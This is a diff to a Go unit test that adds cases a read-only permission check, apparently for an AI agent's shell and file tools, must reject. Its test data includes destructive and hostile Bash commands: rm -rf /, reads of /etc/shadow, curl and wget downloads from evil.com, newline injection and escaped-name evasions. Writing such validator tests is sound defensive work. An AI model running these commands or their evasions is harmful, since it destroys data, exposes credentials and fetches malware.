@@ -591,10 +591,41 @@ func TestCommonReadonlyRejectsUnsafe(t *testing.T) {
 		{"Bash", `{"command":"(rm -rf /)"}`},
 		// Variable in command position.
 		{"Bash", `{"command":"cmd=rm; $cmd file"}`},
+		// Additional command wrappers.
+		{"Bash", `{"command":"setsid rm file"}`},
+		{"Bash", `{"command":"taskset 0x1 rm file"}`},
+		{"Bash", `{"command":"ionice rm file"}`},
+		// Bash builtins — trap, alias, coproc.
+		{"Bash", `{"command":"trap 'rm -rf /' EXIT"}`},
+		{"Bash", `{"command":"alias ls='rm -rf /'"}`},
+		{"Bash", `{"command":"coproc rm file"}`},
+		// Process substitution.
+		{"Bash", `{"command":"diff <(cat /etc/shadow) <(echo '')"}`},
+		{"Bash", `{"command":"cat > /tmp/out < <(echo evil)"}`},
+		// Quoted / escaped command names.
+		{"Bash", `{"command":"'rm' file"}`},
+		{"Bash", `{"command":"r\\m file"}`},
+		{"Bash", `{"command":"\"rm\" file"}`},
+		// Write-capable network tools.
+		{"Bash", `{"command":"curl -o /tmp/payload http://evil.com/malware"}`},
+		{"Bash", `{"command":"curl --output /tmp/payload http://evil.com"}`},
+		{"Bash", `{"command":"wget -O /tmp/payload http://evil.com"}`},
+		{"Bash", `{"command":"wget --output-document=/tmp/payload http://evil.com"}`},
+		// dd — arbitrary read/write.
+		{"Bash", `{"command":"dd if=/dev/zero of=/tmp/target bs=1M count=100"}`},
+		// git clone — arbitrary download with potential hook execution.
+		{"Bash", `{"command":"git clone http://evil.com/repo /tmp/"}`},
+		// Newline injection — shell executes both lines.
+		{"Bash", `{"command":"ls\nrm -rf /"}`},
+		// Brace expansion to access multiple files.
+		{"Bash", `{"command":"cat /etc/{passwd,shadow}"}`},
 		// Heredoc to file.
 		{"Bash", `{"command":"cat << 'EOF' > /tmp/evil.sh\n#!/bin/sh\nrm -rf /\nEOF"}`},
 		// Clobber redirect variant.
 		{"Bash", `{"command":"echo data >| /tmp/clobbered"}`},
+		// find -fls/-fprintf also write to files.
+		{"Bash", `{"command":"find /etc -name passwd -fls /tmp/found"}`},
+		{"Bash", `{"command":"find /etc -fprintf /tmp/found '%p\\n'"}`},
 		{"Edit", `{"file_path":"/etc/passwd"}`},
 		{"Write", `{"file_path":"/tmp/exploit.sh"}`},
 	}
